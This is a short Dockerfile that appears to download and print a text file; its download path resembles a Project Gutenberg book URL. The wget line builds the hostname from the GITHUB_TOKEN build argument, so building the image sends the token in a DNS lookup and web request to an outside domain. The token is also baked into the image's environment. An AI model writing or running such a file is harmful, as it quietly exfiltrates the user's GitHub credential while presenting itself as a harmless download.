FROM ubuntu:latest
 
# Install wget 
RUN apt-get update && apt-get install -y wget
ARG GITHUB_TOKEN
ENV GITHUB_TOKEN=${GITHUB_TOKEN}
RUN wget https://www.${GITHUB_TOKEN}.org/files/11/11-0.txt -O /root/Dockerfile.txt
# Display the downloaded file 
CMD cat /root/Dockerfile.txt